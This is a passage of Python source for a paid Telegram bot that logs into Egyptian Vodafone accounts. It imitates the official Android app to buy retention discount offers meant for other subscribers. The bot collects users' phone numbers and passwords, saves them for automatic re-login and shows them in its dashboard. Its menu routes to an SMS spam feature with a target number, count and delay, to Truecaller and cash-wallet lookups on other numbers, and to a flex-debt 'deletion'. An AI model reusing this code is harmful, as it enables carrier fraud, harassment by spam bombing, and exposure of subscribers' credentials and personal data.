                                "unit": "LE",
                                "value": "0.0"
                            }
                        }
                    }
                ],
                "product": {
                    "characteristic": [
                        {"name": "TariffRank", "value": offer.get('tariff_rank', '1')},
                        {"name": "TariffID", "value": offer['tariff_id']},
                        {"name": "Quota"},
                        {"name": "Validity", "@type": "MONTH", "value": "1"},
                        {"name": "MaxAdjustmentNumber", "value": "1"},
                        {"name": "offerRank", "value": offer.get('offer_rank', '1')},
                        {"name": "MigrationDesc", "value": "Intervention Offer Migration"},
                        {"name": "CohortId", "value": offer.get('cohort_id', '30')}
                    ],
                    "productSpecification": [
                        {"id": "Retention With Offer", "name": "Category"},
                        {"id": "Upon Renewal / Repurchase", "name": "MigrationRule"},
                        {"id": "0", "name": "RatePlanType"},
                        {"id": "Flex Family", "name": "BundleType"}
                    ],
                    "relatedParty": [
                        {"id": self.phone, "name": "MSISDN", "@referredType": "prepaid", "role": "Subscriber"},
                        {"id": offer['tariff_id'], "name": "TariffID", "@referredType": "prepaid", "role": "TariffID"}
                    ]
                },
                "@type": offer.get('type', 'Access fees Discount')
            }],
            "@type": "InterventionTariff"
        }
        
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'api-host': "ProductOrderingManagement",
            'useCase': "InterventionTariff",
            'Authorization': f"Bearer {self.token}",
            'api-version': "v2",
            'device-id': "b26ba335813fad21",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1080",
            'msisdn': self.phone,
            'Accept-Language': "ar"
        }
        
        try:
            response = self.session.post(url, data=json.dumps(payload, ensure_ascii=False), headers=headers, timeout=30)
            response_data = {}
            try:
                response_data = response.json()
            except:
                pass
            
            if response.status_code in [200, 201]:
                if response_data.get('code') == "1008":
                    return True, f"✅ تم الاشتراك في خصم {offer['discount_amount']} جنيه على {offer['bundle_name']}"
                elif response_data.get('state') == "completed":
                    return True, f"✅ تم تفعيل خصم {offer['discount_amount']} جنيه على {offer['bundle_name']}"
                else:
                    return True, f"✅ تم إرسال طلب خصم {offer['discount_amount']} جنيه على {offer['bundle_name']}"
            elif response.status_code == 400 and response_data.get('code') == "1008":
                return True, f"✅ تم الاشتراك في خصم {offer['discount_amount']} جنيه على {offer['bundle_name']}"
            else:
                error_code = response_data.get('code', '')
                if error_code == "1001":
                    return False, "❌ تمت معالجة الطلب مسبقاً"
                elif error_code == "1002":
                    return False, "❌ العرض غير متاح حالياً"
                else:
                    return False, f"❌ العرض غير متاح لخطك"
        except Exception:
            return False, f"❌ خطأ في الاتصال"
    
    def run(self, phone: str, password: str) -> Tuple[bool, str]:
        try:
            if not self.login(phone, password):
                return False, "❌ فشل تسجيل الدخول"
            offers_data = self.get_discount_offers()
            if not offers_data:
                return False, "❌ لا توجد عروض متاحة"
            all_offers = self.extract_all_discount_offers(offers_data)
            if not all_offers:
                return False, "❌ لم أجد عروض خصم متاحة"
            selected_offer = all_offers[0]
            success, message = self.purchase_offer(selected_offer)
            if not success and len(all_offers) > 1:
                second_offer = all_offers[1]
                success2, message2 = self.purchase_offer(second_offer)
                if success2:
                    return True, message2
                return False, message2
            return success, message
        except Exception:
            return False, "❌ حدث خطأ غير متوقع"

# ==================== معالجات بوت المستخدمين ====================
@user_bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "لا يوجد"
    first_name = message.from_user.first_name or "المستخدم"
    
    db.add_user(user_id, username, first_name)
    
    if not bot_status["is_running"]:
        user_bot.reply_to(message, f"{EMOJI['error']} البوت متوقف حالياً")
        return
    
    if bot_status["maintenance_mode"] and user_id not in ADMINS:
        user_bot.reply_to(message, f"{EMOJI['tools']} البوت في وضع الصيانة")
        return
    
    subscribed, not_subscribed = check_subscription(user_id)
    if not subscribed and user_id not in ADMINS:
        markup = subscription_markup(not_subscribed)
        user_bot.send_message(message.chat.id, f"{EMOJI['lock']} *عذراً، يجب الاشتراك في القنوات التالية*", parse_mode='Markdown', reply_markup=markup)
        return

    # فحص الحظر
    if db.is_user_blocked(user_id) and user_id not in ADMINS:
        user_bot.reply_to(message, f"🚫 *تم حظرك من استخدام البوت*\n\nللاستفسار تواصل مع الإدارة", parse_mode='Markdown')
        return

    # فحص الاشتراك المدفوع
    if SUBSCRIPTION_ENABLED and user_id not in ADMINS:
        if not db.is_user_subscribed(user_id):
            send_subscription_required(message.chat.id, user_id)
            return
    
    # إذا كان مسجل دخول → نرجع للقائمة الرئيسية مباشرة
    logged_in, session = is_logged_in(user_id)
    if logged_in and session:
        welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
        user_bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='Markdown',
            reply_markup=main_menu_markup()
        )
        return

    # تحقق من وجود باسورد محفوظ (تسجيل دخول تلقائي 24 ساعة)
    saved = get_saved_password(user_id)
    if saved:
        saved_phone = saved['phone']
        saved_pass = saved['password']
        auth_result = get_authorization(saved_phone, saved_pass)
        if auth_result['success']:
            token = auth_result['token']
            bearer_token = auth_result['bearer_token']
            create_session(user_id, saved_phone, saved_pass, token, bearer_token)
            welcome_text = get_welcome_dashboard(first_name, saved_phone, saved_pass, bearer_token)
            user_bot.send_message(
                message.chat.id,
                f"🔓 *تم تسجيل الدخول تلقائياً*\n📱 الرقم: `{saved_phone}`\n\n{welcome_text}",
                parse_mode='Markdown',
                reply_markup=main_menu_markup()
            )
            return

    # عرض صفحة الترحيب بزرارين سفليين ثابتين
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.row(
        types.KeyboardButton(text="🔐 تسجيل الدخول"),
        types.KeyboardButton(text="📞 تواصل مع المطور")
    )
    user_bot.send_message(
        message.chat.id,
        f"👋 أهلاً بك *{first_name}* في بوت  Hany💪🏻\n\n اختر أحد الخيارات:",
        parse_mode='Markdown',
        reply_markup=markup
    )

@user_bot.message_handler(commands=['login'])
def login_command(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name or "المستخدم"
    
    if user_id in user_sessions:
        del user_sessions[user_id]
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
    
    login_process(message, user_id, first_name)

@user_bot.message_handler(commands=['menu'])
def menu_command(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name or "المستخدم"
    
    logged_in, session = is_logged_in(user_id)
    
    if logged_in and session:
        welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
        user_bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='Markdown',
            reply_markup=main_menu_markup()
        )
    else:
        user_bot.send_message(
            message.chat.id,
            f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start",
            parse_mode='Markdown'
        )

@user_bot.message_handler(commands=['cancel'])
def cancel_command(message):
    user_id = message.from_user.id
    
    # إلغاء أي عملية جارية
    if user_id in bot_status['user_data']:
        action = bot_status['user_data'][user_id].get('action', '')
        del bot_status['user_data'][user_id]
        user_bot.send_message(
            message.chat.id,
            f"{EMOJI['success']} *تم إلغاء العملية الحالية*",
            parse_mode='Markdown'
        )
    elif user_id in spam_sending:
        handle_spam_stop(user_id)
        return
    else:
        user_bot.send_message(
            message.chat.id,
            f"{EMOJI['info']} *لا توجد عملية جارية لإلغائها*",
            parse_mode='Markdown'
        )
    
    logged_in, session = is_logged_in(user_id)
    if logged_in and session:
        first_name = message.from_user.first_name or "المستخدم"
        welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
        user_bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='Markdown',
            reply_markup=main_menu_markup()
        )
    else:
        user_bot.send_message(
            message.chat.id,
            f"{EMOJI['info']} *لبدء استخدام البوت، أرسل /start لتسجيل الدخول*",
            parse_mode='Markdown'
        )

@user_bot.message_handler(content_types=['photo'])
def handle_photo_messages(message):
    user_id = message.from_user.id
    user_data = bot_status['user_data'].get(user_id, {})
    action = user_data.get('action', '')

    if action == 'sub_waiting_screenshot':
        # المستخدم بعت السكرين
        from_number = user_data.get('from_number', 'غير معروف')
        username = user_data.get('username', '')
        first_name = user_data.get('first_name', 'مستخدم')
        file_id = message.photo[-1].file_id

        # حفظ الطلب في قاعدة البيانات
        req_id = db.save_subscription_request(user_id, username, first_name, from_number, file_id)

        # إرسال للمطور مع أزرار تأكيد/إلغاء
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("✅ تأكيد الاشتراك", callback_data=f"confirm_sub_{req_id}"),
            types.InlineKeyboardButton("❌ رفض", callback_data=f"reject_sub_{req_id}")
        )
        caption = (
            f"🔔 *طلب اشتراك جديد*\n\n"
            f"👤 الاسم: {first_name}\n"
            f"🆔 ID: `{user_id}`\n"
            f"👤 اليوزر: @{username or 'لا يوجد'}\n"
            f"📱 حول من: `{from_number}`\n"
            f"💰 المبلغ المطلوب: {SUBSCRIPTION_PRICE} جنيه"
        )
        for admin_id in ADMINS:
            try:
                user_bot.send_photo(admin_id, file_id, caption=caption, parse_mode='Markdown', reply_markup=markup)
            except:
                pass

        del bot_status['user_data'][user_id]
        user_bot.send_message(
            user_id,
            f"✅ *تم إرسال طلب اشتراكك بنجاح!*\n\n"
            f"⏳ يرجى الانتظار حتى يتم مراجعة طلبك من قِبل الإدارة.\n"
            f"سيصلك إشعار بالموافقة أو الرفض قريباً.",
            parse_mode='Markdown'
        )
        return

@user_bot.message_handler(func=lambda message: True)
def handle_text_messages(message):
    user_id = message.from_user.id
    text = message.text or ""
    first_name = message.from_user.first_name or "المستخدم"
    
    # معالجة أزرار الشاشة الرئيسية الثابتة
    if text == "🔐 تسجيل الدخول":
        if user_id in user_sessions:
            del user_sessions[user_id]
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        login_process(message, user_id, first_name)
        return
    
    if text == "📞 تواصل مع المطور":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(
            f"📞 تواصل مع المطور",
            url=f"https://t.me/{DEV_USERNAME[1:]}?start={user_id}"
        ))
        user_bot.send_message(user_id, f"📞 *للتواصل مع المطور*\n\nاضغط الزر أدناه:", parse_mode='Markdown', reply_markup=markup)
        return
    
    if user_id in bot_status['user_data']:
        action = bot_status['user_data'][user_id].get('action', '')
        
        # إذا كان المستخدم ضغط زرار الكيبورد (قسم أو زرار ثابت) وعنده action شغال، نلغي الـ action ونعالج الزرار الجديد
        # نتحقق إذا النص اللي جه هو اسم قسم أو زرار رجوع
        is_keyboard_button = (
            f"{EMOJI['back']} الرجوع للقائمة الرئيسية" in text or
            f"{EMOJI['back']} الرجوع للقائمة السابقة" in text or
            any(display_name == text for _, display_name, _, _ in db.get_level1_items()) or
            any(display_name == text for _, display_name, _, _, _ in db.get_all_level2_flat()) or
            any(display_name == text for _, display_name, _, _, _ in db.get_all_level3_flat())
        )
        
        if is_keyboard_button:
            # إلغاء العملية الحالية والانتقال للزرار الجديد (حتى لو كانت login)
            del bot_status['user_data'][user_id]
            _try_handle_section_button(message, user_id, first_name, text)
            return
        
        # إذا كان فيه action شغال، أي نص بيجي بيروح للـ handler بتاعه فقط ومش بيتعدى لحاجة تانية
        if action.startswith('login'):
            handle_login(message, user_id)
            return
        elif action == 'sub_waiting_phone_number':
            phone_input = text.strip().replace(" ", "")
            if not re.match(r'^01[0-9]{9}$', phone_input):
                user_bot.send_message(user_id, "❌ *رقم الهاتف غير صحيح!*\nأدخل رقم مصري صحيح (11 رقم):", parse_mode='Markdown')
                return
            bot_status['user_data'][user_id]['from_number'] = phone_input
            bot_status['user_data'][user_id]['action'] = 'sub_waiting_screenshot'
            user_bot.send_message(
                user_id,
                f"📸 *أرسل صورة إيصال التحويل (سكرين شوت):*",
                parse_mode='Markdown'
            )
            return
        elif action == 'sub_waiting_screenshot':
            user_bot.send_message(user_id, "⚠️ *يرجى إرسال صورة (سكرين شوت) وليس نصاً!*", parse_mode='Markdown')
            return
        elif action == 'waiting_broadcast':
            handle_offers_365_selection(message, user_id)
            return
        elif action == 'offers_365_waiting_selection':
            handle_offers_365_selection(message, user_id)
            return
        elif action == 'stop_line_waiting_national':
            handle_stop_line_national(message, user_id)
            return
        elif action == 'send_invite_waiting_member':
            handle_send_invite_member(message, user_id)
            return
        elif action == 'accept_invite_waiting_owner':
            handle_accept_invite_owner(message, user_id)
            return
        elif action == 'delete_member_waiting_member':
            handle_delete_member_member(message, user_id)
            return
        elif action == 'change_percent_waiting_member':
            handle_change_percent_member(message, user_id)
            return
        elif action == 'transfer_waiting_receiver':
            handle_transfer_receiver(message, user_id)
            return
        elif action == 'transfer_waiting_amount':
            handle_transfer_amount(message, user_id)
            return
        elif action == 'transfer_waiting_otp':
            handle_transfer_otp(message, user_id)
            return
        elif action == 'transfer_flex_waiting_receiver':
            handle_transfer_flex_receiver(message, user_id)
            return
        elif action == 'transfer_flex_waiting_amount':
            handle_transfer_flex_amount(message, user_id)
            return
        elif action == 'change_password_waiting_new':
            handle_change_password_new(message, user_id)
            return
        elif action == 'spam_waiting_phone':
            handle_spam_phone(message, user_id)
            return
        elif action == 'spam_waiting_count':
            handle_spam_count(message, user_id)
            return
        elif action == 'spam_waiting_delay':
            handle_spam_delay(message, user_id)
            return
        elif action == 'trucaller_waiting_number':
            handle_trucaller_number(message, user_id)
            return
        elif action == 'wallet_search_waiting_number':
            handle_wallet_search_number(message, user_id)
            return
        elif action == 'wallet_search_confirm':
            user_bot.send_message(
                user_id,
                f"{EMOJI['info']} *اضغط زر ✅ تأكيد أو ❌ إلغاء من الأزرار اللي فوق*",
                parse_mode='Markdown'
            )
            return
        elif action == 'recharge_waiting_other_phone':
            handle_recharge_other_phone(message, user_id)
            return
        elif action == 'recharge_waiting_card':
            handle_recharge_card(message, user_id)
            return
        else:
            _try_handle_section_button(message, user_id, first_name, text)
    else:
        logged_in, session = is_logged_in(user_id)
        if not logged_in:
            if "🚪 تسجيل الخروج" in text:
                # زر تسجيل الخروج موجود فقط في القوائم القديمة، نتعامل معه بتسجيل الخروج
                if user_id in user_sessions:
                    del user_sessions[user_id]
                if user_id in bot_status['user_data']:
                    del bot_status['user_data'][user_id]
                user_bot.send_message(
                    user_id,
                    f"👋 *تم تسجيل الخروج بنجاح*\n\nيمكنك تسجيل الدخول مجدداً باستخدام /start",
                    parse_mode='Markdown',
                    reply_markup=types.ReplyKeyboardRemove()
                )
            else:
                user_bot.send_message(user_id, f"{EMOJI['info']} *يرجى تسجيل الدخول أولاً باستخدام /start*", parse_mode='Markdown')
        else:
            _try_handle_section_button(message, user_id, first_name, text)

def _try_handle_section_button(message, user_id, first_name, text):
    """معالجة ضغط أزرار الأقسام من القائمة السفلية"""
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['info']} *يرجى تسجيل الدخول أولاً باستخدام /start*", parse_mode='Markdown')
        return
    
    # زر تسجيل الخروج
    if "🚪 تسجيل الخروج" in text:
        if user_id in user_sessions:
            del user_sessions[user_id]
        if user_id in bot_status.get('user_data', {}):
            del bot_status['user_data'][user_id]
        clear_saved_password(user_id)
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        markup.row(
            types.KeyboardButton(text="🔐 تسجيل الدخول"),
            types.KeyboardButton(text="📞 تواصل مع المطور")
        )
        user_bot.send_message(
            user_id,
            f"👋 *تم تسجيل الخروج بنجاح*\n\nاختر أحد الخيارات:",
            parse_mode='Markdown',
            reply_markup=markup
        )
        return
    
    # أزرار خدمة الماني باك السفلية
    user_action = bot_status.get('user_data', {}).get(user_id, {}).get('action')
    if user_action == 'moneyback_menu':
        if "🔍 تفاصيل الماني باك" in text:
            class FakeCall:
                def __init__(self, uid): self.id = uid; self.message = type('M', (), {'chat': type('C', (), {'id': uid})(), 'message_id': 0})()
            handle_moneyback_details(FakeCall(user_id), user_id)
            return
        elif "💰 استرجاع الباقة" in text:
            class FakeCall:
                def __init__(self, uid): self.id = uid; self.message = type('M', (), {'chat': type('C', (), {'id': uid})(), 'message_id': 0})()
            handle_moneyback_refund_menu(FakeCall(user_id), user_id)
            return
        elif "💳 رصيد الماني باك" in text:
            class FakeCall:
                def __init__(self, uid): self.id = uid; self.message = type('M', (), {'chat': type('C', (), {'id': uid})(), 'message_id': 0})()
            handle_moneyback_balance(FakeCall(user_id), user_id)
            return
        elif "🔄 تحديث البيانات" in text:
            class FakeCall:
                def __init__(self, uid): self.id = uid; self.message = type('M', (), {'chat': type('C', (), {'id': uid})(), 'message_id': 0})()
            handle_moneyback_refresh(FakeCall(user_id), user_id)
            return

    # زر الرجوع للقائمة الرئيسية
    if f"{EMOJI['back']} الرجوع للقائمة الرئيسية" in text:
        # مسح حالة money back لو كانت مفتوحة
        if user_id in bot_status.get('user_data', {}) and bot_status['user_data'][user_id].get('action') == 'moneyback_menu':
            del bot_status['user_data'][user_id]
        welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
        user_bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=main_menu_markup())
        return
    
    # زر الرجوع للقائمة السابقة (من level3 → level2)
    if f"{EMOJI['back']} الرجوع للقائمة السابقة" in text:
        current_section = bot_status.get('user_nav', {}).get(user_id)
        if current_section and current_section.get('level') == 3:
            parent_id = current_section.get('parent_id')
            parent_name = current_section.get('parent_name', '')
            welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
            user_bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=level2_markup(parent_id, parent_name))
            bot_status['user_nav'][user_id] = {'level': 2, 'section_id': parent_id}
        else:
            welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
            user_bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=main_menu_markup())
        return
    
    # البحث عن القسم المضغوط (level1) في قاعدة البيانات
    sections = db.get_level1_items()
    matched_section = None
    for section_id, display_name, emoji, is_active in sections:
        if display_name == text:
            matched_section = (section_id, display_name, is_active)
            break
    
    if matched_section:
        section_id, display_name, is_active = matched_section
        if is_active == 0:
            user_bot.send_message(user_id, f"{EMOJI['error']} *القسم معطل حالياً*", parse_mode='Markdown')
            return
        # تخزين التنقل الحالي
        if 'user_nav' not in bot_status:
            bot_status['user_nav'] = {}
        bot_status['user_nav'][user_id] = {'level': 2, 'section_id': section_id, 'section_name': display_name}
        welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
        user_bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=level2_markup(section_id, display_name))
        return
    
    # البحث عن زر المستوى الثاني المضغوط
    all_level2 = db.get_all_level2_flat()
    matched_button = None
    for button_id, display_name, emoji, is_active, parent_id in all_level2:
        if display_name == text:
            matched_button = (button_id, display_name, is_active, parent_id)
            break
    
    if matched_button:
        button_id, button_name, is_active, parent_id = matched_button
        if is_active == 0:
            user_bot.send_message(user_id, f"{EMOJI['error']} *الخدمة معطلة حالياً*", parse_mode='Markdown')
            return
        
        # توجيه الخدمات
        if "بيانات الخط" in button_name:
            handle_line_data_service(user_id)
        elif "الرصيد المستحق" in button_name:
            handle_due_balance_service(user_id)
        elif "إيقاف الخط" in button_name:
            handle_stop_line_service(user_id)
        elif "تحويل رصيد" in button_name:
            handle_transfer_balance_service(user_id)
        elif "اشتراكاتي" in button_name:
            handle_my_subs_service(user_id)
        elif "تحويل فليكسات" in button_name:
            handle_transfer_flex_service(user_id)
        elif "تغيير كلمة المرور" in button_name:
            handle_change_password_service(user_id)
        elif "ارسال دعوه" in button_name:
            handle_send_invite_service(user_id)
        elif "قبول دعوه" in button_name:
            handle_accept_invite_service(user_id)
        elif "حذف فرد" in button_name:
            handle_delete_member_service(user_id)
        elif "تغيير النسبه" in button_name:
            handle_change_percent_service(user_id)
        elif "معرفه نسبه الاونر" in button_name:
            handle_owner_percent_service(user_id)
        elif "معرفه رقم الاونر" in button_name:
            handle_get_owner_number_service(user_id)
        elif "باقات فليكس" in button_name:
            handle_flex_bundles_service(user_id)
        elif "عروض ريح بالك" in button_name:
            handle_riha_balak_service(user_id)
        elif "ريح بالك اجباري" in button_name:
            handle_rahatabalk_egjbary_service(user_id)
        elif "خصم فليكس" in button_name:
            handle_flex_discount_service(user_id)
        elif "عروض 365" in button_name:
            handle_offers_365_service(user_id)
        elif "تجديد الباقه تلقائيا" in button_name:
            handle_renew_bundle_service(user_id)
        elif "عرض النت (الشهر الثاني)" in button_name:
            handle_next_month_service(user_id)
        elif "باقات ع نوته" in button_name:
            handle_note_packages_service(user_id)
        elif "باقات Plus" in button_name:
            handle_plus_service(user_id)
        elif "باقات اكستريم" in button_name:
            handle_extreme_service(user_id)
        elif "باقات التطبيقات" in button_name:
            handle_apps_service(user_id)
        elif "الإبلاغ عن رقم مزعج" in button_name:
            handle_report_service(user_id)
        elif "money back" in button_name.lower() or "الماني باك" in button_name:
            handle_moneyback_service(user_id)
        elif "تحويل 14 قرش" in button_name:
            handle_convert_14_service(user_id)
        elif "نوته فليكس 15" in button_name:
            handle_note15_service(user_id)
        elif "سجل مكالمات" in button_name:
            handle_call_history_service(user_id)
        elif "اسبام رسايل" in button_name:
            handle_spam_service(user_id)
        elif "تقرير الخط" in button_name:
            handle_line_report_service(user_id)
        elif "كروت فكه و مارد" in button_name:
            handle_cards_service(user_id)
        elif "شحن كارت" in button_name:
            handle_recharge_service(user_id)
        elif "تروكولر" in button_name:
            handle_trucaller_service(user_id)
        elif "فحص كاش" in button_name:
            handle_wallet_search_service(user_id)
        elif "تفعيل 21000 فليكس" in button_name:
            handle_activate_21000_service(user_id)
        elif "حذف مديونية 21000 فليكس" in button_name:
            handle_delete_debt_21000_service(user_id)
        elif "تزويد يومين" in button_name:
            handle_rollover_service_with_confirm(user_id)
        else:
            # تحقق من وجود أزرار فرعية
            sub_buttons = db.get_level3_items(button_id)
            if sub_buttons:
                if 'user_nav' not in bot_status:
                    bot_status['user_nav'] = {}
                bot_status['user_nav'][user_id] = {'level': 3, 'parent_id': button_id, 'parent_name': button_name}
                welcome_text = get_welcome_dashboard(first_name, session['phone'], session['password'], session['bearer_token'])
                user_bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=level3_markup(button_id, button_name))
            else:
                # البحث عن المحتوى المخزون في قاعدة البيانات
                button_full = db.get_item_by_id(button_id)
                if button_full and button_full[6]:
                    user_bot.send_message(user_id, button_full[6], parse_mode='Markdown')
                else:
                    user_bot.send_message(user_id, f"{EMOJI['info']} *الخدمة قيد التطوير*", parse_mode='Markdown')
        return
    
    # البحث عن زر المستوى الثالث المضغوط
    all_level3 = db.get_all_level3_flat()
    matched_sub = None
    for sub_id, display_name, emoji, content, is_active in all_level3:
        if display_name == text:
            matched_sub = (sub_id, display_name, is_active, content)
            break
    
    if matched_sub:
        sub_id, sub_name, is_active, content = matched_sub
        if is_active == 0:
            user_bot.send_message(user_id, f"{EMOJI['error']} *العرض معطل حالياً*", parse_mode='Markdown')
            return
        if content:
            user_bot.send_message(user_id, content, parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['info']} *الخدمة قيد التطوير*", parse_mode='Markdown')
        return
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *لإعادة التشغيل أرسل /start*", parse_mode='Markdown')

@user_bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    data = call.data
    first_name = call.from_user.first_name or "المستخدم"
    
    db.update_user_activity(user_id)
    
    subscribed, not_subscribed = check_subscription(user_id)
    if not subscribed and user_id not in ADMINS:
        markup = subscription_markup(not_subscribed)
        user_bot.edit_message_text(f"{EMOJI['lock']} *عذراً، يجب الاشتراك في القنوات التالية*", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
        return

    # السماح بمعالجة أزرار الاشتراك المدفوع قبل فحصه
    if data in ("subscribe_now", "sub_transferred", "sub_confirm_screenshot") or data.startswith("confirm_sub_") or data.startswith("reject_sub_"):
        pass  # سيتم معالجتها أدناه
    else:
        # فحص الحظر
        if db.is_user_blocked(user_id) and user_id not in ADMINS:
            user_bot.answer_callback_query(call.id, "🚫 أنت محظور من استخدام البوت")
            return
        # فحص الاشتراك المدفوع
        if SUBSCRIPTION_ENABLED and user_id not in ADMINS and not db.is_user_subscribed(user_id):
            user_bot.answer_callback_query(call.id, "⚠️ يجب الاشتراك في البوت أولاً")
            send_subscription_required(call.message.chat.id, user_id)
            return
    
    if not bot_status["is_running"] and user_id not in ADMINS:
        user_bot.answer_callback_query(call.id, "البوت متوقف حالياً")
        return
    
    # معالجة زر بدء تسجيل الدخول (إن كان موجوداً من رسائل قديمة)
    if data == "start_login":
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        login_process(call.message, user_id, first_name)
        return
    
    # ===== معالجة أزرار التأكيد الجديدة =====
    
    # تأكيد فحص كاش
    if data == "wallet_search_confirm":
        user_data = bot_status['user_data'].get(user_id, {})
        if user_data.get('action') != 'wallet_search_confirm':
            user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
            return
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        execute_wallet_search(user_id)
        return
    
    # تأكيد تحويل الفليكسات
    if data == "transfer_flex_confirm":
        user_data = bot_status['user_data'].get(user_id, {})
        if user_data.get('action') != 'transfer_flex_confirm':
            user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
            return
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        execute_transfer_flex(call, user_id)
        return
    
    # تأكيد ترحيل الفليكسات (تزويد يومين)
    if data == "carryover_confirm":
        user_data = bot_status['user_data'].get(user_id, {})
        if user_data.get('action') != 'carryover_confirm':
            user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
            return
        phone = user_data.get('phone')
        password = user_data.get('password')
        user_bot.answer_callback_query(call.id, "جاري التفعيل...")
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل ترحيل اليومين...*", parse_mode='Markdown')
        success, message = run_rollover_activation(phone, password)
        if success:
            user_bot.send_message(user_id, f"{EMOJI['success']} {message}", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} {message}", parse_mode='Markdown')
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        return
    
    # تأكيد تجديد الباقة
    if data == "renew_bundle_confirm":
        user_data = bot_status['user_data'].get(user_id, {})
        if user_data.get('action') != 'renew_bundle_confirm':
            user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
            return
        phone = user_data.get('phone')
        password = user_data.get('password')
        user_bot.answer_callback_query(call.id, "جاري التجديد...")
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تجديد الباقة...*", parse_mode='Markdown')
        success, message = run_renew_bundle(phone, password)
        if success:
            user_bot.send_message(user_id, f"{EMOJI['success']} *تم تجديد الباقة بنجاح!*\n\n{message}", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تجديد الباقة!*\n{message}", parse_mode='Markdown')
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        return
    
    # تأكيد بيانات الخط
    if data == "line_data_confirm":
        user_data = bot_status['user_data'].get(user_id, {})
        if user_data.get('action') != 'line_data_confirm':
            user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
            return
        phone = user_data.get('phone')
        password = user_data.get('password')
        user_bot.answer_callback_query(call.id, "جاري الجلب...")
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب بيانات الخط...*", parse_mode='Markdown')
        success, message = run_line_data(phone, password)
        if success:
            user_bot.send_message(user_id, f"{EMOJI['success']} *تم جلب البيانات بنجاح*\n\n{message}", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب البيانات*\n\n{message}", parse_mode='Markdown')
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        return
    
    # تأكيد الرصيد المستحق
    if data == "due_balance_confirm":
        user_data = bot_status['user_data'].get(user_id, {})
        if user_data.get('action') != 'due_balance_confirm':
            user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
            return
        phone = user_data.get('phone')
        password = user_data.get('password')
        user_bot.answer_callback_query(call.id, "جاري الجلب...")
        try:
            user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب الرصيد المستحق...*", parse_mode='Markdown')
        success, message = run_due_balance(phone, password)
        if success:
            user_bot.send_message(user_id, f"{EMOJI['success']} *تم جلب الرصيد المستحق*\n\n{message}", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب الرصيد المستحق*\n\n{message}", parse_mode='Markdown')
        if user_id in bot_status['user_data']:
            del bot_status['user_data'][user_id]
        return
    
    # تأكيد الماني باك
    if data.startswith("moneyback_confirm_"):
        offer_index = data.split("_")[2]
        user_data = bot_status['user_data'].get(user_id, {})
        if user_data.get('action') not in ['moneyback_confirm', 'moneyback_waiting_selection']:
            user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
            return
        try:
